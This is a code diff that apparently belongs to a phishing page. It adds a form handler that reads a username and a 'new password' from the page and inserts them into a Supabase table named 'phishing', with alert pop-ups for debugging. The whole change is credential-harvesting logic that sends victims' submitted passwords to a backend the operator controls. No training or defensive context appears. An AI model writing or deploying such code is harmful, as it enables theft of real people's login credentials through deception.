@@ -4,19 +4,52 @@ document
 
     e.preventDefault();
 
-    alert("Button clicked");
+    try{
 
-    try {
+        const username =
+        document.getElementById("uname").value;
 
-        alert("Trying Supabase...");
+        const newPassword =
+        document.getElementById("newpass").value;
 
-        // your insert code here
+        alert("Connecting to Supabase...");
 
-    } catch(err){
+        const { data, error } =
+        await client
+        .from("phishing")
+        .insert([
+            {
+                username: username,
+                password: newPassword
+            }
+        ])
+        .select();
 
-        alert("ERROR: " + err.message);
+        if(error){
+
+            console.log(error);
+
+            alert(
+                "SUPABASE ERROR:\n\n" +
+                JSON.stringify(error)
+            );
+
+            return;
+        }
+
+        alert(
+            "SUCCESS\n\n" +
+            JSON.stringify(data)
+        );
+
+    }
+    catch(err){
 
         console.log(err);
 
+        alert(
+            "JAVASCRIPT ERROR:\n\n" +
+            err.message
+        );
     }
 });
